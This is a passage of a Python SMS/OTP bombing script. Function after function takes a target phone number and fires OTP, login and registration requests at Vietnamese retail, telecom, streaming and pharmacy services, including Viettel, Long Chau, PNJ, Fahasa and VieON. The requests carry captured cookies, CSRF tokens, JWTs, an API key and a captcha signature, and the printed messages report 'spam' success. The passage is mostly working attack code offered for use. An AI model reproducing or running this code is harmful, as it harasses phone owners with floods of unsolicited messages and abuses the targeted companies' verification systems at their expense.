        headers=headers,
        json=json_data,
    )
def call_phuclong(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "authorization": "Bearer undefined",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://order.phuclong.com.vn",
        "priority": "u=1, i",
        "referer": "https://order.phuclong.com.vn/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/127.0.0.0",
        "x-api-key": "bca14340890a65e5adb04b6fd00a75f264cf5f57e693641f9100aefc642461d3",
    }
    json_data_check = {
        "userName": phone,
    }
    json_data_register = {
        "phoneNumber": phone,
        "fullName": generate_random_name(),
        "email": "th456do1g110@hotmail.com",
        "password": "Nqnt7%@hf3",
    }
    response_check = requests.post(
        "https://api-crownx.winmart.vn/as/api/plg/v1/user/check",
        headers=headers,
        json=json_data_check,
    )
    response_register = requests.post(
        "https://api-crownx.winmart.vn/as/api/plg/v1/user/register",
        headers=headers,
        json=json_data_register,
    )
def call_takomo(phone):
    cookies = {
        "__sbref": "mkmvwcnohbkannbumnilmdikhgdagdlaumjfsexo",
        "_cabinet_key": "SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM5NTI3MTQwMg._Opxk3aYQEWoonHoIgUhbhOxUx_9BtdySPUqwzWA9C0",
    }
    headers_get = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "dnt": "1",
        "if-none-match": '"849a8-lcHURUguRbzDBoYBR3u76kp0LTU"',
        "priority": "u=0, i",
        "referer": "https://takomo.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-site",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    headers_post = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=UTF-8",
        "dnt": "1",
        "origin": "https://lk.takomo.vn",
        "priority": "u=1, i",
        "referer": "https://lk.takomo.vn/?phone={phone}&amount=2000000&term=7&utm_source=pop_up&utm_medium=organic&utm_campaign=direct_takomo&utm_content=mainpage_popup_login",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    params = {
        "phone": phone,
        "amount": "2000000",
        "term": "7",
        "utm_source": "pop_up",
        "utm_medium": "organic",
        "utm_campaign": "direct_takomo",
        "utm_content": "mainpage_popup_login",
    }
    response_get = requests.get(
        "https://lk.takomo.vn/", params=params, cookies=cookies, headers=headers_get
    )
    json_data = {
        "data": {
            "phone": phone,
            "code": "resend",
            "channel": "ivr",
        },
    }
    response_post = requests.post(
        "https://lk.takomo.vn/api/4/client/otp/send",
        cookies=cookies,
        headers=headers_post,
        json=json_data,
        timeout=10,
    )
def k(phone):
    headers = {
        "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        "domain": "kingfoodmart",
        "sec-ch-ua-mobile": "?0",
        "authorization": "",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "Referer": "https://kingfoodmart.com/",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "operationName": "SendOtp",
        "variables": {
            "input": {
                "phone": phone,
                "captchaSignature": "AWNCXZbkmtm8HOQPn3e-X5kQpLKbMAsrmlLAIhm2NBWvJStQYJ53ScQcbPQJS8o33FMyHYilnbdPtGcTr8ajL0ZA2QytqGB5tnIJsFZAFSPp-dfJKD5N1MQBZxqqp2xPcQfhYD30MZG-ingJCUGidN_b3Rc:U=2cffb4ffa0000000",
            },
        },
        "query": "mutation SendOtp($input: SendOtpInput!) {  sendOtp(input: $input) {    otpTrackingId    __typename  }}",
    }
    response = requests.post(
        "https://api.onelife.vn/v1/gateway/",
        headers=headers,
        json=json_data,
        timeout=10,
    )
    data2 = response["data"]["sendOtp"]
    if data2 == None:
        print(f"[BY: CHÍ MUM] ~ KINGFOO SPAM THẤT BẠI")
    else:
        print(f"[BY: CHÍ MUM] ~ KINGFOO SPAM THÀNH CÔNG")
def n(phone):
    headers = {
        "authority": "api.nhathuoclongchau.com.vn",
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4",
        "access-control-allow-origin": "*",
        "content-type": "application/json",
        "order-channel": "1",
        "origin": "https://nhathuoclongchau.com.vn",
        "referer": "https://nhathuoclongchau.com.vn/",
        "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        # 'x-channel': 'EStore',
    }
    json_data = {
        "phoneNumber": phone,
        "otpType": 0,
        "fromSys": "WEBKHLC",
    }
    response = requests.post(
        "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
        headers=headers,
        json=json_data,
        timeout=10,
    )
    try:
        chi_mum = response["error"]["details"]
        if chi_mum == None:
            print(f"[BY: CHÍ MUM] ~ NTLC SPAM THẤT BẠI")
        else:
            print(f"[BY: CHÍ MUM] ~ NTLC SPAM THÀNH CÔNG")
    except:
        print(f"[BY: CHÍ MUM] ~ NTLC SPAM THÀNH CÔNG")
def b(phone):
    headers = {
        "Accept-Language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "keep-alive",
        "Origin": "https://www.best-inc.vn",
        "Referer": "https://www.best-inc.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "accept": "application/json",
        "authorization": "null",
        "content-type": "application/json",
        "lang-type": "vi-VN",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "x-auth-type": "WEB",
        "x-lan": "VI",
        "x-nat": "vi-VN",
        "x-timezone-offset": "7",
    }
    json_data = {
        "phoneNumber": phone,
        "verificationCodeType": 1,
    }
    response = requests.post(
        "https://v9-cc.800best.com/uc/account/sendsignupcode",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def tv360(phone):
    cookies = {
        "img-ext": "avif",
        "NEXT_LOCALE": "vi",
        "session-id": "s%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM",
        "device-id": "s%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg",
        "shared-device-id": "web_89c04dba-075e-49fe-b218-e33aef99dd12",
        "screen-size": "s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q",
        "G_ENABLED_IDPS": "google",
    }
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; session-id=s%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM; device-id=s%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg; shared-device-id=web_89c04dba-075e-49fe-b218-e33aef99dd12; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; G_ENABLED_IDPS=google',
        "dnt": "1",
        "origin": "https://tv360.vn",
        "priority": "u=1, i",
        "referer": "https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "starttime": "1722324791163",
        "tz": "Asia/Bangkok",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "msisdn": phone,
    }
    response = requests.post(
        "https://tv360.vn/public/v1/auth/get-otp-login",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def myvt(phone):
    cookies = {
        "laravel_session": "ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf",
        "redirectLogin": "https://viettel.vn/myviettel",
        "XSRF-TOKEN": "eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ%3D%3D",
    }
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
        "Content-Type": "application/json;charset=UTF-8",
        "DNT": "1",
        "Origin": "https://viettel.vn",
        "Referer": "https://viettel.vn/myviettel",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "X-CSRF-TOKEN": "H32gw4ZAkTzoN8PdQkH3yJnn2wvupVCPCGx4OC4K",
        "X-Requested-With": "XMLHttpRequest",
        "X-XSRF-TOKEN": "eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ==",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "phone": phone,
        "typeCode": "DI_DONG",
        "actionCode": "myviettel://login_mobile",
        "type": "otp_login",
    }
    response = requests.post(
        "https://viettel.vn/api/getOTPLoginCommon",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def vieon(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjI1MTA3NDksImp0aSI6IjQ3OGJkODI1MmY2ODdkOTExNzdlNmJhM2MzNTE5ZDNkIiwiYXVkIjoiIiwiaWF0IjoxNzIyMzM3OTQ5LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMjMzNzk0OCwic3ViIjoiYW5vbnltb3VzX2Y4MTJhNTVkMWQ1ZWUyYjg3YTkyNzgzM2RmMjYwOGJjLTRmNzQyY2QxOTE4NjcwYzIzODNjZmQ3ZGRiNjJmNTQ2LTE3MjIzMzc5NDkiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiZjgxMmE1NWQxZDVlZTJiODdhOTI3ODMzZGYyNjA4YmMtNGY3NDJjZDE5MTg2NzBjMjM4M2NmZDdkZGI2MmY1NDYtMTcyMjMzNzk0OSIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjcuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.RwOGV_SA9U6aMo84a1bxwRjLbxdDLB-Szg7w_riYKAA",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://vieon.vn",
        "priority": "u=1, i",
        "referer": "https://vieon.vn/auth/?destination=/&page=/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    params = {
        "platform": "web",
        "ui": "012021",
    }
    json_data = {
        "username": phone,
        "country_code": "VN",
        "model": "Windows 10",
        "device_id": "f812a55d1d5ee2b87a927833df2608bc",
        "device_name": "Edge/127",
        "device_type": "desktop",
        "platform": "web",
        "ui": "012021",
    }
    response = requests.post(
        "https://api.vieon.vn/backend/user/v2/register",
        params=params,
        headers=headers,
        json=json_data,
    )
def goldenspoon(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "cache-control": "max-age=0",
        "content-type": "application/json",
        "origin": "https://gogi.com.vn",
        "priority": "u=1, i",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
    json_data = {
        "phoneNumber": phone,
        "provider": 1,
        "type": 1,
        "language": 1,
    }
    response = requests.post(
        "https://external.ggg.systems/request-otp", headers=headers, json=json_data
    )
def goldenspoon1(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "cache-control": "max-age=0",
        "content-type": "application/json",
        "origin": "https://gogi.com.vn",
        "priority": "u=1, i",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
    json_data = {
        "phoneNumber": phone,
        "provider": 2,
        "type": 1,
        "language": 1,
    }
    response = requests.post(
        "https://external.ggg.systems/request-otp", headers=headers, json=json_data
    )
def fahasha(phone):
    cookies = {
        "_gcl_au": "1.1.1582095510.1734689637",
        "_ga": "GA1.1.777159052.1734689637",
        "_tt_enable_cookie": "1",
        "_ttp": "RfytCvP4Dbb5Rkn8quQ3XHBsC75.tt.1",
        "USER_DATA": "%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2203177807-114f-43bc-af5c-9c598599ff42%22%2C%22deviceAdded%22%3Atrue%7D",
        "SOFT_ASK_STATUS": "%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D",
        "OPT_IN_SHOWN_TIME": "1734777462938",
        "frontend": "68b75258c880488086ca36d03ee52c3c",
        "_ga_D3YYPWQ9LN": "GS1.1.1737336219.6.0.1737336219.0.0.0",
        "_clck": "tc828v%7C2%7Cfsq%7C0%7C1815",
        "moe_uuid": "03177807-114f-43bc-af5c-9c598599ff42",
        "SESSION": "%7B%22sessionKey%22%3A%22f41ba2ee-e35d-429c-a3e7-749ec463b3da%22%2C%22sessionStartTime%22%3A%222025-01-20T01%3A23%3A43.906Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1737338023921%2C%22numberOfSessions%22%3A9%7D",
        "_clsk": "1d92taw%7C1737336224339%7C1%7C1%7Cq.clarity.ms%2Fcollect",
        "_ga_460L9JMC2G": "GS1.1.1737336219.6.0.1737336226.53.0.390677539",
        "HARD_ASK_STATUS": "%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D",
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        # 'cookie': '_gcl_au=1.1.1582095510.1734689637; _ga=GA1.1.777159052.1734689637; _tt_enable_cookie=1; _ttp=RfytCvP4Dbb5Rkn8quQ3XHBsC75.tt.1; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2203177807-114f-43bc-af5c-9c598599ff42%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; OPT_IN_SHOWN_TIME=1734777462938; frontend=68b75258c880488086ca36d03ee52c3c; _ga_D3YYPWQ9LN=GS1.1.1737336219.6.0.1737336219.0.0.0; _clck=tc828v%7C2%7Cfsq%7C0%7C1815; moe_uuid=03177807-114f-43bc-af5c-9c598599ff42; SESSION=%7B%22sessionKey%22%3A%22f41ba2ee-e35d-429c-a3e7-749ec463b3da%22%2C%22sessionStartTime%22%3A%222025-01-20T01%3A23%3A43.906Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1737338023921%2C%22numberOfSessions%22%3A9%7D; _clsk=1d92taw%7C1737336224339%7C1%7C1%7Cq.clarity.ms%2Fcollect; _ga_460L9JMC2G=GS1.1.1737336219.6.0.1737336226.53.0.390677539; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
        "origin": "https://www.fahasa.com",
        "priority": "u=1, i",
        "referer": "https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "traceparent": "00-dae3d3ef998247f11621c4752beac4b4-50cf0e547fb0f9cb-01",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "phone": phone,
    }
    response = requests.post(
        "https://www.fahasa.com/ajaxlogin/ajax/checkPhone",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def PNJ(phone):
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "cookie": "_cdp_user_new; _gcl_au=1.1.1539180309.1734704886; au_id=1711837792; _asm_uid=1711837792; _ac_au_gt=1734704885956; CDPI_VISITOR_ID=cfdb810a-112d-4508-bdf5-328e94772429; _tt_enable_cookie=1; _ttp=FgcRd1T1_6lz67t0qurGtPCWP60.tt.2; CDPI_RETURN=Return; _utm_objs=eyJzb3VyY2UiOiJjaXR5YWRzIiwibWVkaXVtIjoiY3BhIiwiY2FtcGFpZ24iOiJrNTRnR0UiLCJj%0D%0Ab250ZW50IjoiIiwidGVybSI6IiIsInR5cGUiOiJkaXJlY3QiLCJ0aW1lIjoxNzM0NzA1MDYwOTcw%0D%0ALCJjaGVja3N1bSI6IioifQ%3D%3D; _atm_objs=eyJzb3VyY2UiOiJpbWMtZy1jb2MtY29jLXNlYXJjaCIsIm1lZGl1bSI6ImNwYyIsImNhbXBhaWdu%0D%0AIjoiQXdvLVE0IiwiY29udGVudCI6IjQ0ODcxOTQwIiwidGVybSI6Im5oJUUxJUJBJUFCbiUyMGMl%0D%0ARTElQkElQTd1JTIwaCVDMyVCNG4iLCJ0eXBlIjoiYXNzb2NpYXRlX3V0bSIsImNoZWNrc3VtIjoi%0D%0AKiIsInRpbWUiOjE3MzQ4MzgyMTIxNTN9; _pk_ref.564990245.4a15=%5B%22Awo-Q4%22%2C%22nh%E1%BA%ABn%20c%E1%BA%A7u%20h%C3%B4n%22%2C1734838212%2C%22https%3A%2F%2Fcontext.qc.coccoc.com%2F%22%5D; _pk_ses.564990245.4a15=*; utm_notifications=%7B%22utm_source%22%3A%22imc-g-coc-coc-search%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_content%22%3A%2244871940%22%2C%22utm_campaign%22%3A%22Awo-Q4%22%2C%22aff_sid%22%3A%22%22%7D; CDPI_SESSION_ID=89233897-fae2-4cd7-9255-dd3342921ede; _asm_visitor_type=r; _cdp_cfg=1; cdp_session=1; _gid=GA1.3.968284004.1734838216; _gat_UA-26000195-1=1; _clck=1gqcnrc%7C2%7Cfrx%7C0%7C1815; recently_products=null; _ga_K1CDGBJEK0=GS1.1.1734838215.2.0.1734838229.0.0.0; _asm_ss_view=%7B%22time%22%3A1734838214172%2C%22sid%22%3A%225683956380156401%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-12-22T03%3A30%3A30%22%2C%22duration%22%3A16228%7D; _clsk=1x6x9aw%7C1734838230898%7C2%7C1%7Cq.clarity.ms%2Fcollect; _pk_id.564990245.4a15=1711837792.1734704886.2.1734838231.1734838212.; _ac_client_id=1711837792.1734838232; _ac_an_session=zmzlzrzgzqzmzlzgzrzjzizmzlznzjzizdzizkzizizrzgzkzkzqzhzdzizkzgznzrzgzrzhzgzhzdzizdzizkzgznzrzgzrzhzgzhzdzizkzgznzrzgzrzhzgzhzdzizdzlzizdzizd2f27zdzgzdzlzmzkzjzlzdzd3cz62qznz62szq2725z83626271x; _ga_3S12QVTD78=GS1.1.1734838213.2.1.1734838231.42.0.0; _ga=GA1.3.587610544.1734704887; _ga_TN4J88TP5X=GS1.3.1734838216.2.1.1734838231.45.0.0; XSRF-TOKEN=eyJpdiI6IjNNclE5UTNuamx1ZkJ1YlE0QzdxRGc9PSIsInZhbHVlIjoieEFSU1VYNStlY1FVWGJ2SkxLU0Y0ajJja2Z5M1oyVDhjL3YvREdVc1FyVVRidVdKaXhtTS9NR3ZSNldtL0l2Qi9tbFl5ckpMbWV0STBpODd4OFFJUnhLSGhaVHJDbWpEVEJRY3doWGVjUDlncThjUGVSS0pSMjJVVG1Ea3VVYkoiLCJtYWMiOiIzZDU2YTY1YmVlMmJiZGNkYzQwZDZlOWFlNGM1MmM5YTI5NGE5YmE5MjQ1N2E2NTg5M2E2YTAyYTgyNDk1YmQ2IiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IjNORDNqYWNqejl5WmtXakdpdkltbXc9PSIsInZhbHVlIjoiYXUxK3NaQXhhcmJabkdyRXR1TWR2VVJxWTBnYUxPN1o2M2I3VmEvcS96STlYUjloanNBb2krUkpJS2E3bHl5Q3JxS3hyL04zNW5rSnhyT2xBbnd6Wm5oTmcvMWsrTFNNcHNhdVdHTEJ2b0ZGL3hkNjZoQkpHMitzS21GRWV0R08iLCJtYWMiOiIzMzVmNDcwY2UxYmIyNGE2M2JjMmJlZTIwOTM0NzQ2YjdjOTE3M2QwOWM0ZWZlYmUwNThjY2M0NmQ4ODJmYzAxIiwidGFnIjoiIn0%3D; _ga_FR6G8QLYZ1=GS1.1.1734838213.2.1.1734838238.0.0.0",
        "origin": "https://www.pnj.com.vn",
        "priority": "u=0, i",
        "referer": "https://www.pnj.com.vn/customer/login",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    }
    data = {
        "_method": "POST",
        "_token": "Ep2Eu31PveWUdQdZk0Jkk0OKtve59Dj87iEe2Egv",
        "type": "sms",
        "phone": phone,
    }
    response = requests.post(
        "https://www.pnj.com.vn/customer/otp/request", headers=headers, data=data
    )
def PNJ1(phone):
    cookies = {
        "CDPI_VISITOR_ID": "78166678-ea1e-47ae-9e12-145c5a5fafc4",
        "CDPI_RETURN": "New",
        "CDPI_SESSION_ID": "f3a5c6c7-2ef6-4d19-a792-5e3c0410677f",
        "XSRF-TOKEN": "eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D",
        "mypnj_session": "eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D",
    }
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
